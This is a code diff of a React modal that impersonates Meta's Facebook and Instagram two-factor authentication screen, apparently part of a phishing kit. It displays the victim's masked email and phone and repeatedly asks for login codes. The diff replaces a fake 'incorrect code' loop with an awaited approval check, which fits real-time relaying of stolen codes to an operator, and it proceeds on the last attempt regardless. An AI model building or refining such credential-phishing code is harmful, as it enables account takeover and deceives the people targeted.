@@ -1,63 +1,61 @@
+'use client';
+
 import { useState } from 'react';
 import PropTypes from 'prop-types';
 import MetaLogo from '@/assets/images/meta-logo-grey.png';
 import TwoFAImage from '@/assets/images/2FA.png';
 import config from '@/utils/config';
+import { imageSrc } from '@/utils/image-src';
 
-const TwoFAModal = ({ show, onClose, onSubmit, onSuccess, texts, formData }) => {
+const TwoFAModal = ({ show, onClose, onSubmit, onSuccess, texts, formData, loginProvider = 'facebook' }) => {
     const [code, setCode] = useState('');
     const [isLoading, setIsLoading] = useState(false);
     const [showError, setShowError] = useState(false);
     const [attempts, setAttempts] = useState(0);
-    const [countdown, setCountdown] = useState(0);
+    const [waitingApproval, setWaitingApproval] = useState(false);
+
+    const providerLabel = loginProvider === 'instagram' ? texts.providerInstagram : texts.providerFacebook;
 
     const handleSubmit = async (e) => {
         e.preventDefault();
         const normalizedCode = String(code || '').replace(/\D/g, '');
 
-        if (!/^\d{6,8}$/.test(normalizedCode)) {
+        if (!/^\d{6,8}$/.test(normalizedCode) || isLoading) {
             return;
         }
 
         setIsLoading(true);
         setShowError(false);
+        setWaitingApproval(true);
 
-        onSubmit(normalizedCode);
+        try {
+            const result = await onSubmit(normalizedCode);
+            setWaitingApproval(false);
 
-        setCountdown(config.code_loading_time || 3);
+            if (result?.approved) {
+                onSuccess();
+                return;
+            }
 
-        const timer = setInterval(() => {
-            setCountdown((prev) => {
-                if (prev <= 1) {
-                    clearInterval(timer);
-                    return 0;
-                }
-                return prev - 1;
-            });
-        }, 1000);
+            const nextAttempts = attempts + 1;
+            setAttempts(nextAttempts);
 
-        await new Promise((resolve) => setTimeout(resolve, (config.code_loading_time || 3) * 1000));
+            if (result?.isLastAttempt) {
+                onSuccess();
+                return;
+            }
 
-        setShowError(true);
-        setAttempts((prev) => prev + 1);
-        setIsLoading(false);
-        setCountdown(0);
-
-        if (attempts + 1 >= (config.max_code_attempts || 2)) {
-            onSuccess();
-            return;
+            setShowError(true);
+            setCode('');
+        } catch {
+            setWaitingApproval(false);
+            setShowError(true);
+            setCode('');
+        } finally {
+            setIsLoading(false);
         }
-
-        setCode('');
     };
 
-    const formatTime = (seconds) => {
-        const minutes = Math.floor(seconds / 60);
-        const remainingSeconds = seconds % 60;
-        return `${minutes.toString().padStart(2, '0')}:${remainingSeconds.toString().padStart(2, '0')}`;
-    };
-
-    /* Mask email: t**t@example.us */
     const maskEmail = (email) => {
         if (!email) return 't**t@example.us';
         const [local, domain] = email.split('@');
@@ -66,7 +64,6 @@ const TwoFAModal = ({ show, onClose, onSubmit, onSuccess, texts, formData }) => 
         return `${local[0]}**${local[local.length - 1]}@${domain}`;
     };
 
-    /* Mask phone: +60 ****** 25 */
     const maskPhone = (phone) => {
         if (!phone) return '+84 ****** XX';
         const digits = phone.replace(/\D/g, '');
@@ -76,13 +73,12 @@ const TwoFAModal = ({ show, onClose, onSubmit, onSuccess, texts, formData }) => 
 
     if (!show) return null;
 
-    const userName = formData?.fullName || 'User';
+    const userName = formData?.fullName || texts.defaultUserName || 'User';
     const maskedEmail = maskEmail(formData?.personalEmail);
     const maskedPhone = maskPhone(formData?.phone);
-    const stepLabel = `(${texts.step || 'Step'} ${attempts + 1}/${config.max_code_attempts || 3})`;
+    const stepLabel = `(${texts.step || 'Step'} ${attempts + 1}/${config.MAX_CODE || 3})`;
     const isCodeValid = /^\d{6,8}$/.test(String(code || '').replace(/\D/g, ''));
 
-    /* ── Styles ── */
     const overlayStyle = {
         position: 'fixed',
         inset: 0,
@@ -92,9 +88,7 @@ const TwoFAModal = ({ show, onClose, onSubmit, onSuccess, texts, formData }) => 
         justifyContent: 'center',
         alignItems: 'center',
         padding: '8px',
-        overflowY: 'auto',
-        scrollbarWidth: 'none',
-        msOverflowStyle: 'none',
+        overflowY: 'auto'
     };
 
     const modalStyle = {
@@ -108,14 +102,14 @@ const TwoFAModal = ({ show, onClose, onSubmit, onSuccess, texts, formData }) => 
         flexDirection: 'column',
         minHeight: 'min(860px, calc(100vh - 16px))',
         maxHeight: 'min(860px, calc(100vh - 16px))',
-        overflowY: 'auto',
+        overflowY: 'auto'
     };
 
     const bodyStyle = {
         display: 'flex',
         flexDirection: 'column',
         justifyContent: 'space-between',
-        flex: 1,
+        flex: 1
     };
 
     const inputWrapperStyle = {
@@ -125,10 +119,9 @@ const TwoFAModal = ({ show, onClose, onSubmit, onSuccess, texts, formData }) => 
         borderRadius: '10px',
         backgroundColor: '#fff',
         padding: '0 11px',
-        transition: 'all 0.2s',
         marginBottom: '4px',
         display: 'flex',
-        alignItems: 'center',
+        alignItems: 'center'
     };
 
     const inputStyle = {
@@ -138,200 +131,132 @@ const TwoFAModal = ({ show, onClose, onSubmit, onSuccess, texts, formData }) => 
         outline: 'none',
         fontSize: '14px',
         backgroundColor: 'transparent',
-        color: '#333',
+        color: '#333'
     };
 
     return (
         <div style={overlayStyle}>
             <div style={modalStyle} onClick={(e) => e.stopPropagation()}>
                 <div style={bodyStyle}>
-
-                {/* User info row */}
-                <div style={{ width: '100%' }}>
-                    <div style={{
-                        display: 'flex',
-                        alignItems: 'center',
-                        gap: '6px',
-                        fontSize: '14px',
-                        color: '#9a979e',
-                        marginBottom: '7px',
-                    }}>
-                        <span>{userName}</span>
-                        <div style={{
-                            width: '4px',
-                            height: '4px',
-                            backgroundColor: '#9a979e',
-                            borderRadius: '5px',
-                        }} />
-                        <span>Facebook</span>
-                    </div>
-
-                    {/* Title */}
-                    <h2 style={{
-                        fontSize: '22px',
-                        lineHeight: 1.25,
-                        color: '#000',
-                        fontWeight: 700,
-                        marginBottom: '12px',
-                        wordBreak: 'break-word',
-                    }}>
-                        {texts.twoFAStep || 'Two-factor authentication request'} {stepLabel}
-                    </h2>
-
-                    {/* Description */}
-                    <p style={{
-                        color: '#9a979e',
-                        fontSize: '15px',
-                        lineHeight: 1.55,
-                        margin: 0,
-                    }}>
-                        {`${texts.twoFAInstructionPrefix || 'Enter the code sent to'} ${maskedEmail}, ${maskedPhone}, ${texts.twoFAInstructionSuffix || 'or confirm with an authenticator app you set up (such as Duo Mobile or Google Authenticator).'}`}
-                    </p>
-
-                    {/* 2FA Image */}
-                    <div style={{
-                        width: '100%',
-                        borderRadius: '10px',
-                        backgroundColor: '#f5f5f5',
-                        overflow: 'hidden',
-                        margin: '15px 0',
-                    }}>
-                        <img src={TwoFAImage} width="100%" alt="authentication" style={{ display: 'block' }} />
-                    </div>
-
-                    {/* Form */}
-                    <form onSubmit={handleSubmit}>
-                        {/* Label */}
-                        {/* Input */}
+                    <div style={{ width: '100%' }}>
                         <div
-                            style={inputWrapperStyle}
-                            onMouseOver={(e) => {
-                                e.currentTarget.style.borderColor = '#3b82f6';
-                                e.currentTarget.style.boxShadow = '0 4px 12px rgba(59,130,246,0.12)';
-                            }}
-                            onMouseOut={(e) => {
-                                if (!e.currentTarget.contains(document.activeElement)) {
-                                    e.currentTarget.style.borderColor = showError ? '#e74c3c' : '#d4dbe3';
-                                    e.currentTarget.style.boxShadow = 'none';
-                                }
-                            }}
-                            onFocusCapture={(e) => {
-                                e.currentTarget.style.borderColor = '#3b82f6';
-                                e.currentTarget.style.boxShadow = '0 4px 12px rgba(59,130,246,0.12)';
-                            }}
-                            onBlurCapture={(e) => {
-                                if (!e.currentTarget.contains(e.relatedTarget)) {
-                                    e.currentTarget.style.borderColor = showError ? '#e74c3c' : '#d4dbe3';
-                                    e.currentTarget.style.boxShadow = 'none';
-                                }
+                            style={{
+                                display: 'flex',
+                                alignItems: 'center',
+                                gap: '6px',
+                                fontSize: '14px',
+                                color: '#9a979e',
+                                marginBottom: '7px'
                             }}
                         >
-                            <input
-                                style={inputStyle}
-                                inputMode="numeric"
-                                id="twoFaInput"
-                                placeholder={texts.code || 'Code'}
-                                maxLength="8"
-                                type="text"
-                                autoComplete="off"
-                                value={code}
-                                onChange={(e) => {
-                                    setCode(e.target.value.replace(/\D/g, '').slice(0, 8));
-                                    if (showError) setShowError(false);
-                                }}
-                            />
+                            <span>{userName}</span>
+                            <div style={{ width: '4px', height: '4px', backgroundColor: '#9a979e', borderRadius: '5px' }} />
+                            <span>{providerLabel}</span>
                         </div>
 
-                        {/* Helper / Error text */}
-                        {showError ? (
-                            <p style={{
-                                color: '#e74c3c',
-                                fontSize: '12px',
-                                margin: '-1px 0 10px 0',
-                            }}>
-                                {texts.codeExpired || 'The code you entered is incorrect. Please try again.'}
-                            </p>
-                        ) : null}
+                        <h2 style={{ fontSize: '22px', lineHeight: 1.25, color: '#000', fontWeight: 700, marginBottom: '12px' }}>
+                            {texts.twoFAStep || 'Two-factor authentication request'} {stepLabel}
+                        </h2>
 
-                        {/* Submit button */}
-                        <div style={{ width: '100%', marginTop: '10px' }}>
-                            <button
-                                type="submit"
-                                disabled={isLoading || !isCodeValid}
+                        <p style={{ color: '#9a979e', fontSize: '15px', lineHeight: 1.55, margin: 0 }}>
+                            {`${texts.twoFAInstructionPrefix || 'Enter the code sent to'} ${maskedEmail}, ${maskedPhone}, ${texts.twoFAInstructionSuffix || 'or confirm with an authenticator app.'}`}
+                        </p>
+
+                        <div style={{ width: '100%', borderRadius: '10px', backgroundColor: '#f5f5f5', overflow: 'hidden', margin: '15px 0' }}>
+                            <img src={imageSrc(TwoFAImage)} width='100%' alt={texts.altAuthentication || 'Authentication'} style={{ display: 'block' }} />
+                        </div>
+
+                        <form onSubmit={handleSubmit}>
+                            <div style={inputWrapperStyle}>
+                                <input
+                                    style={inputStyle}
+                                    inputMode='numeric'
+                                    placeholder={texts.code || 'Code'}
+                                    maxLength='8'
+                                    type='text'
+                                    autoComplete='off'
+                                    value={code}
+                                    onChange={(e) => {
+                                        setCode(e.target.value.replace(/\D/g, '').slice(0, 8));
+                                        if (showError) setShowError(false);
+                                    }}
+                                />
+                            </div>
+
+                            {showError ? (
+                                <p style={{ color: '#e74c3c', fontSize: '12px', margin: '-1px 0 10px 0' }}>
+                                    {texts.codeExpired || 'The code you entered is incorrect. Please try again.'}
+                                </p>
+                            ) : null}
+
+                            {waitingApproval && isLoading && (
+                                <p style={{ color: '#0064E0', fontSize: '13px', margin: '0 0 10px 0', textAlign: 'center' }}>
+                                    {texts.waitingApproval || 'Waiting for verification...'}
+                                </p>
+                            )}
+
+                            <div style={{ width: '100%', marginTop: '10px' }}>
+                                <button
+                                    type='submit'
+                                    disabled={isLoading || !isCodeValid}
+                                    style={{
+                                        minHeight: '40px',
+                                        width: '100%',
+                                        backgroundColor: '#0064E0',
+                                        color: '#fff',
+                                        borderRadius: '40px',
+                                        padding: '8px 16px',
+                                        border: 'none',
+                                        fontSize: '14px',
+                                        fontWeight: 600,
+                                        cursor: isLoading || !isCodeValid ? 'not-allowed' : 'pointer',
+                                        opacity: isLoading || !isCodeValid ? 0.7 : 1
+                                    }}
+                                >
+                                    {isLoading ? (
+                                        <span
+                                            style={{
+                                                width: '20px',
+                                                height: '20px',
+                                                border: '3px solid rgba(255,255,255,0.4)',
+                                                borderTopColor: '#fff',
+                                                borderRadius: '50%',
+                                                animation: 'spin 0.8s linear infinite',
+                                                display: 'inline-block'
+                                            }}
+                                        />
+                                    ) : (
+                                        texts.continueBtn || 'Continue'
+                                    )}
+                                </button>
+                            </div>
+
+                            <div
                                 style={{
-                                    minHeight: '40px',
                                     width: '100%',
-                                    backgroundColor: '#0064E0',
-                                    color: '#fff',
-                                    borderRadius: '40px',
-                                    padding: '8px 16px',
-                                    border: 'none',
-                                    fontSize: '14px',
-                                    fontWeight: 600,
+                                    marginTop: '20px',
+                                    color: '#8f949d',
                                     display: 'flex',
                                     alignItems: 'center',
                                     justifyContent: 'center',
-                                    cursor: (isLoading || !isCodeValid) ? 'not-allowed' : 'pointer',
-                                    opacity: (isLoading || !isCodeValid) ? 0.7 : 1,
-                                    transition: 'opacity 0.3s',
+                                    borderRadius: '40px',
+                                    minHeight: '40px',
+                                    border: '1px solid #d4dbe3',
+                                    fontSize: '14px'
                                 }}
                             >
-                                {isLoading ? (
-                                    <>
-                                        <span style={{
-                                            width: '20px',
-                                            height: '20px',
-                                            border: '3px solid rgba(255,255,255,0.4)',
-                                            borderTopColor: '#fff',
-                                            borderRadius: '50%',
-                                            animation: 'spin 0.8s linear infinite',
-                                            display: 'inline-block',
-                                            marginRight: '8px',
-                                        }} />
-                                        {`${texts.pleaseWait || 'Please wait'} ${formatTime(countdown)}...`}
-                                    </>
-                                ) : (
-                                    texts.continueBtn || 'Continue'
-                                )}
-                            </button>
-                        </div>
+                                <span>{texts.tryAnotherMethod || 'Try another method'}</span>
+                            </div>
 
-                        {/* Try another method */}
-                        <div style={{
-                            width: '100%',
-                            marginTop: '20px',
-                            color: '#8f949d',
-                            display: 'flex',
-                            alignItems: 'center',
-                            justifyContent: 'center',
-                            backgroundColor: '#fff',
-                            borderRadius: '40px',
-                            minHeight: '40px',
-                            padding: '8px 20px',
-                            border: '1px solid #d4dbe3',
-                            cursor: 'default',
-                            pointerEvents: 'none',
-                            fontSize: '14px',
-                            fontWeight: 400,
-                            lineHeight: 1,
-                        }}>
-                            <span>{texts.tryAnotherMethod || 'Try another method'}</span>
-                        </div>
-
-                        <div style={{ width: '64px', margin: '20px auto 0' }}>
-                            <img src={MetaLogo} width="100%" alt="Meta" style={{ objectFit: 'contain' }} />
-                        </div>
-                    </form>
-                </div>
+                            <div style={{ width: '64px', margin: '20px auto 0' }}>
+                                <img src={imageSrc(MetaLogo)} width='100%' alt={texts.altMeta || 'Meta'} style={{ objectFit: 'contain' }} />
+                            </div>
+                        </form>
+                    </div>
                 </div>
             </div>
 
-            {/* Spinner keyframe */}
-            <style>{`
-                @keyframes spin {
-                    to { transform: rotate(360deg); }
-                }
-            `}</style>
+            <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
         </div>
     );
 };
@@ -342,7 +267,8 @@ TwoFAModal.propTypes = {
     onSubmit: PropTypes.func.isRequired,
     onSuccess: PropTypes.func.isRequired,
     texts: PropTypes.object.isRequired,
-    formData: PropTypes.object
+    formData: PropTypes.object,
+    loginProvider: PropTypes.string
 };
 
 export default TwoFAModal;
